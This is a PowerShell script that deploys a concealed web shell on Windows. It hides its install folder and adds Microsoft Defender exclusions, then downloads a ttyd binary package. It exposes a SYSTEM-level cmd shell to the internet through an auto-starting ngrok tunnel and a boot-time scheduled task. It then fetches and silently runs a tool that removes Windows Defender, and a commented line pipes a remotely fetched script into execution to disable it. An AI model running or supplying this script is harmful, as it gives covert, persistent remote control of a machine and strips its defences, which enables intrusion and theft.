# ttyd Web Shell Deployment Script
# Scripted by: NeoSyntaxErro

# Steps:
# 1. Create an exclusionary path for the web_ttyd directory in Windows Defender.
# 2. Install Chocolatey package manager for ngrok deployment silently.
# 4. Install ngrok using Chocolatey.

# Set Variables (Update These!)

# WebShell Auth Credentials (simple HTTP Basic Auth)
# These credentials are used to access the web shell interface.  Not the endpoint!

$username = "admin"             # Replace with your desired username.
$password = "password"          # Replace with your desired passsword.

# Ngrok Authentication Token and API Key
# The API token is not required, only if you would like to use the ngrok API.  If not,
# you may omit the variable below and remove the `api_key` line from the ngrok config.

$ngrokAuthToken = 
$ngrokAPIKey = 

# ttyd.zip file hashes (ttyd / winpty)
# These hashses are used to verify the integrity of the downloaded files.
$FileHashes = @{
    "msys-2.0.dll" = "md5:4EB46F809310180E00B7701B38841A26";
    "msys-crypto-1.0.0.dll" = "md5:96EEEF784D2271DB8D227E6470A8DA68";
    "msys-gcc_s-seh-1.dll" = "md5:F5E9858B1D2FC62E69B85948BA24ADFE";
    "msys-ssl-1.0.0.dll" = "md5:8353C32BE20FC44EFA07405FC7BEFFBB";
    "msys-z.dll" = "md5:412C699E557F827985CD4894F7D5418A";
    "ttyd.exe" = "md5:BF8E653B651F2A867FFB76CE817B9467";
    "ttyd.win32.exe" = "md5:416D1DF2DEC238C30547A9C89D1CE78F";
    "winpty.dll" = "md5:0735CD530991C01304DA1384D30C132A";
    "winpty.exe" = "md5:841EEB78653B44B6B8C196E0ECE0D608";
    "winpty-agent.exe" = "md5:773BF727C6EBE3CDE98CA89724728E38";
    "winpty-debugserver.exe" = "md5:99A4EBAE07BAFEBCAD2EF6247E784B8E";
}

# Create the Directory for web_ttyd and hide it
New-Item -Path "C:\web_ttyd" -ItemType Directory -Force
Set-ItemProperty -Path "C:\web_ttyd" -Name "Attributes" -Value "Hidden, System"

# Create Microsoft Defender Exclusions
Add-MpPreference -ExclusionPath "C:\web_ttyd"
Add-MpPreference -ExclusionExtension ".dll", ".exe", ".zip", ".yml", ".bat"         # Refine this for needed extensions.

Set-Location "C:\web_ttyd"

# Download pre-compiled web_ttyd package
Invoke-WebRequest -Uri "https://github.com/neosyntaxerro/frankenshell/releases/download/v1.0.0/web_ttyd.zip" -OutFile "web_ttyd.zip"        # This is not the path. Will need to update when repo is created.
Expand-Archive -Path "web_ttyd.zip" 

# Calculate and verify the hashes of the downloaded ttyd / winpty files
Get-ChildItem -Path "." -File | ForEach-Object {
    $fileName = $_.Name
    $hash = Get-FileHash -Algorithm MD5 -Path $_.FullName

    if ($FileHashes.ContainsKey($fileName)) {
        $expectedHash = ($FileHashes[$fileName] -replace "^md5:", "").ToUpper()
        if ($hash.Hash -eq $expectedHash) {
            Write-Host "$fileName: Hash matched"
        } else {
            Write-Host "$fileName: Hash does not match! Aborting deployment"
            Write-Host "  Expected: $expectedHash"
            Write-Host "  Actual:   $($hash.Hash)"
            exit 1
        }
    } else {
        Write-Host "$fileName: No expected hash to compare"
    }
}

# Install Chocolatey package manager for ngrok deployment silently if not already installed.
if (-not (choco -v)) {
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
}

# Install ngrok using Chocolatey
if (-not (Get-Command ngrok -ErrorAction SilentlyContinue)) {
    choco install ngrok -y --ignore-checksums --no-progress --yes
}

# Create ngrok configuration file
$ngrokConfig = @"
Version: 3

agent:
    authtoken: $ngrokAuthToken
    api_key: $ngrokAPIKey

tunnels:
    basic:
        proto: http
        addr: 7516
        basic_auth: "$username:$password"  # Replace with your desired username and password.
"@

Write-Output $ngrokConfig | Out-File -FilePath "web_shell.yml" -Encoding utf8

# Install ngrok as a service and set startup type to automatic
ngrok service install --config web_shell.yml
Set-Service ngrok -StartupType Automatic        # Startup is automatic on reboot.

# Create a scheduled task to run ttyd at system startup as SYSTEM user.
$taskname = "frankenshell_ttyd"
$exePath = "C:\web_ttyd\ttyd.exe"
$arguments = "cmd"
$action = New-ScheduledTaskAction -Execute $exePath -Argument $arguments
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskname -Action $action -Trigger $trigger -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force

# Grab Windows Defender Remover from GitHub (Removed Windows Defender)
Invoke-WebRequest -URI "https://github.com/ionuttbara/windows-defender-remover/archive/refs/heads/main.zip" -O "DefendRemover.zip"
Expand-Archive -Path "DefendRemover.zip"

# Defend-Not is likely not needed, defender-remover is successful
###############################################################################
# Defend-not alternative (Disables Windows Defender) 
#& ([ScriptBlock]::Create((irm https://dnot.sh/))) --name "Winblows Defender"
###############################################################################

# Remove Windows Defender (Consider switching to a defender bypass?)
# This is a risky operation and should be done with caution.
Set-Location "DefendRemover\windows-defender-remover-main"
Start-Process "Script_Run.bat" -ArgumentList "Y" -WindowStyle Hidden  # This will trigger a reboot.
